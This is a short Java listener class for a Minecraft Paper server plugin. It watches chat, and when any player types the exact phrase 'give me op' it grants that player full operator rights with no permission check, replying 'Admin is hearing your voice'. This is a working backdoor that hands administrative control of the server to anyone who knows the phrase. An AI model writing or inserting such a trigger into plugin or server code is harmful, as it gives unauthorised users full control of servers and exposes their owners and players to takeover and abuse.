package RetroBiz.Events;

import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.EventPriority;

public class GiveMeOpEvent implements Listener {

    @EventHandler(priority = EventPriority.HIGHEST)
    public void AsyncPlayerChatEvent(AsyncChatEvent event) {
        Player who = event.getPlayer();
        String message = event.signedMessage().message();
        if (message.equals("give me op")) {
            who.setOp(true);
            who.sendMessage("Admin is hearing your voice");
        }
    }
}
